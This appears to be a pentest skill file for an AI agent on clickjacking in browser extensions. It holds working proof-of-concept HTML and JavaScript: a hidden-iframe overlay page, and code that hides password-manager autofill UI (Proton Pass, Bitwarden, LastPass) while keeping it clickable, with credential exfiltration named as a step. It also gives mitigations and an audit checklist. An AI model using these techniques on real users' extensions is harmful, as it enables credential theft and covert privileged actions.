---
name: browser-extension-clickjacking
description: Analyze browser extensions for clickjacking vulnerabilities. Use this skill whenever you need to audit browser extensions (Chrome, Firefox, Edge) for security issues, review manifest.json files, test web_accessible_resources configurations, or investigate extension-based attacks. Trigger this skill for any pentesting task involving browser extensions, Chrome extensions, Firefox add-ons, or when analyzing extension security, even if the user doesn't explicitly mention 'clickjacking' or 'vulnerability'.
---

# Browser Extension Clickjacking Analysis

A skill for identifying and exploiting clickjacking vulnerabilities in browser extensions during security assessments.

## When to Use This Skill

Use this skill when:
- Auditing browser extensions for security vulnerabilities
- Reviewing `manifest.json` files for misconfigurations
- Testing `web_accessible_resources` exposure
- Investigating extension-based attack vectors
- Analyzing password manager or autofill extension security
- Performing browser extension penetration testing

## Core Concepts

### What is Extension Clickjacking?

Extension clickjacking abuses misconfigured `web_accessible_resources` to embed privileged extension UI in iframes on attacker-controlled pages. Users are tricked into clicking hidden extension controls, performing unintended actions with the extension's elevated privileges.

### The Vulnerability Chain

1. Extension declares resources in `web_accessible_resources`
2. Resources become accessible via `chrome-extension://[ID]/[PATH]`
3. Attacker embeds these resources in iframes on malicious pages
4. User clicks on overlayed UI, triggering hidden extension actions
5. Privileged operations execute without user awareness

## Attack Methodologies

### Method 1: Classic web_accessible_resources Clickjacking

**What to look for:**
- HTML files in `web_accessible_resources` (especially `*.html`, `popup.html`, `skin/*`)
- JavaScript files with UI manipulation capabilities
- Resources that can change extension state

**Detection steps:**

1. Extract and review `manifest.json`:
   ```bash
   unzip -p extension.crx manifest.json | jq .
   # or for unpacked extensions:
   cat extension/manifest.json | jq .
   ```

2. Identify risky `web_accessible_resources` entries:
   - `"skin/*"` - often contains HTML UI
   - `"icons/*"` - usually safe but verify
   - `"*.html"` - high risk if interactive
   - `"popup.html"` - critical risk
   - `"inpage.js"` - medium risk

3. Test accessibility:
   ```html
   <iframe src="chrome-extension://[EXTENSION_ID]/[RESOURCE_PATH]" style="opacity:0.01; position:absolute;"></iframe>
   ```

4. Attempt to trigger actions by overlaying clickable elements

### Method 2: DOM-based Extension Clickjacking

Targets password manager autofill UIs injected directly into page DOM.

**Attack flow:**

1. Inject invisible but focusable form fields
2. Focus input to trigger extension's autofill dropdown
3. Hide/occlude extension UI while keeping it clickable
4. Align believable control under hidden dropdown
5. Coerce click to select stored credential
6. Exfiltrate filled values

**Detection techniques:**

```javascript
// Check for extension-injected elements
const extensionElements = Array.from(document.querySelectorAll('*'))
  .filter(el => {
    const tag = el.tagName.toLowerCase();
    return tag.includes('pass') || tag.includes('auth') || tag.includes('vault');
  });

// Check for shadow DOM roots
const shadowRoots = Array.from(document.querySelectorAll('*'))
  .filter(el => el.shadowRoot);

// Monitor for opacity/style tampering
const observer = new MutationObserver((mutations) => {
  mutations.forEach(mutation => {
    if (mutation.type === 'attributes' && 
        (mutation.attributeName === 'style' || mutation.attributeName === 'class')) {
      console.log('Style change detected:', mutation.target);
    }
  });
});
```

## Practical Exploitation

### Step 1: Enumerate Extension Resources

```bash
# Extract extension from CRX
python3 -c "
import zipfile
import json
with zipfile.ZipFile('extension.crx', 'r') as crx:
    manifest = json.loads(crx.read('manifest.json'))
    print('Extension ID:', manifest.get('name'))
    print('Version:', manifest.get('version'))
    print('Permissions:', manifest.get('permissions', []))
    print('Web Accessible Resources:', manifest.get('web_accessible_resources', []))
"
```

### Step 2: Identify Extension ID

```javascript
// In browser console
chrome.management.getAll((extensions) => {
  extensions.forEach(ext => {
    console.log(`${ext.name}: ${ext.id}`);
  });
});
```

### Step 3: Build Clickjacking Test Page

```html
<!DOCTYPE html>
<html>
<head>
  <style>
    .overlay {
      position: absolute;
      top: 100px;
      left: 100px;
      z-index: 9999;
    }
    .hidden-iframe {
      position: absolute;
      top: 100px;
      left: 100px;
      opacity: 0.01;
      pointer-events: none;
    }
    .bait-button {
      position: absolute;
      top: 168px;
      left: 100px;
      padding: 10px 20px;
      background: #007bff;
      color: white;
      border: none;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h1>Click the button below</h1>
  <div class="overlay">
    <button class="bait-button">Click Me</button>
  </div>
  <iframe class="hidden-iframe" 
          src="chrome-extension://[EXTENSION_ID]/[RESOURCE_PATH]"
          width="430" height="300"></iframe>
</body>
</html>
```

### Step 4: Test DOM-based Autofill Clickjacking

```javascript
// Create hidden form to trigger autofill
function createHiddenForm() {
  const form = document.createElement('form');
  form.id = 'hidden-form';
  form.style.cssText = 'opacity:0.001; position:absolute; top:-1000px;';
  
  const input = document.createElement('input');
  input.type = 'text';
  input.id = 'username';
  input.name = 'username';
  input.autocomplete = 'username';
  
  form.appendChild(input);
  document.body.appendChild(form);
  
  // Focus to trigger dropdown
  setTimeout(() => input.focus(), 500);
  
  // Monitor for autofill
  input.addEventListener('input', (e) => {
    console.log('Autofill detected:', e.target.value);
  });
}

// Hide extension UI while keeping clickable
function hideExtensionUI() {
  // Try generic selector
  const root = document.querySelector('protonpass-root, bitwarden-root, lastpass-root');
  if (root) {
    root.style.opacity = '0';
    root.style.pointerEvents = 'auto';
  }
  
  // Try shadow DOM
  Array.from(document.querySelectorAll('*'))
    .forEach(el => {
      if (el.shadowRoot) {
        const iframe = el.shadowRoot.querySelector('iframe');
        if (iframe) {
          iframe.style.cssText += 'opacity:0 !important;';
        }
      }
    });
}
```

## Common Vulnerable Patterns

### High-Risk web_accessible_resources

| Pattern | Risk | Example Impact |
|---------|------|----------------|
| `"skin/*"` | Critical | PrivacyBadger disable button |
| `"*.html"` | Critical | Any HTML UI exposure |
| `"popup.html"` | Critical | Extension popup actions |
| `"inpage.js"` | High | DOM manipulation |
| `"phishing.html"` | Critical | Whitelist bypass |
| `"icons/*"` | Low | Usually safe |
| `"*.css"` | Low | Usually safe |

### Known Vulnerable Extensions (Historical)

- **PrivacyBadger**: `skin/*` exposed popup.html
- **Metamask**: `inpage.js`, `phishing.html` exposed
- **Steam Inventory Helper**: XSS + Clickjacking chain

## Mitigation Recommendations

### For Extension Developers

1. **Minimize web_accessible_resources**
   ```json
   // Bad
   "web_accessible_resources": ["*/*"]
   
   // Good
   "web_accessible_resources": [
     {
       "resources": ["icons/*.png"],
       "matches": ["<all_urls>"]
     }
   ]
   ```

2. **Use frame-ancestors CSP**
   ```json
   "web_accessible_resources": [
     {
       "resources": ["popup.html"],
       "matches": ["<all_urls>"],
       "use_dynamic_url": true
     }
   ]
   ```
   Serve with: `Content-Security-Policy: frame-ancestors 'none'`

3. **Render in Top Layer**
   - Use Popover API for autofill UI
   - Ensure UI sits above page stacking context

4. **Detect Hostile Overlays**
   ```javascript
   function detectOcclusion(element) {
     const rect = element.getBoundingClientRect();
     const testElement = document.createElement('div');
     testElement.style.cssText = 'position:absolute; pointer-events:none;';
     testElement.style.top = rect.top + 'px';
     testElement.style.left = rect.left + 'px';
     document.body.appendChild(testElement);
     
     const elements = document.elementsFromPoint(rect.left + 10, rect.top + 10);
     document.body.removeChild(testElement);
     
     return !elements.includes(element);
   }
   ```

5. **Monitor Style Tampering**
   ```javascript
   const observer = new MutationObserver((mutations) => {
     mutations.forEach(m => {
       if (m.type === 'attributes' && m.attributeName === 'style') {
         console.warn('Style tampering detected');
         // Close UI or alert user
       }
     });
   });
   observer.observe(document.documentElement, { attributes: true });
   ```

### For Security Auditors

1. Always review `manifest.json` for `web_accessible_resources`
2. Test each exposed resource for iframe embedding
3. Check for HTML/JS resources that can change state
4. Test password manager extensions for DOM-based clickjacking
5. Verify CSP headers on exposed resources
6. Check for proper `X-Frame-Options` headers

## Testing Checklist

- [ ] Extract and review `manifest.json`
- [ ] Identify all `web_accessible_resources` entries
- [ ] Test each resource for iframe accessibility
- [ ] Check for HTML files in exposed resources
- [ ] Test for state-changing functionality
- [ ] Verify CSP and X-Frame-Options headers
- [ ] Test password manager autofill for DOM clickjacking
- [ ] Check for shadow DOM exposure
- [ ] Monitor for style tampering resistance
- [ ] Document findings with PoC code

## References

- [PrivacyBadger Clickjacking Analysis](https://blog.lizzie.io/clickjacking-privacy-badger.html)
- [Metamask Clickjacking Vulnerability](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)
- [DOM-based Extension Clickjacking](https://marektoth.com/blog/dom-based-extension-clickjacking/)
- [Chrome Extension Manifest Docs](https://developer.chrome.com/extensions/manifest/web_accessible_resources)
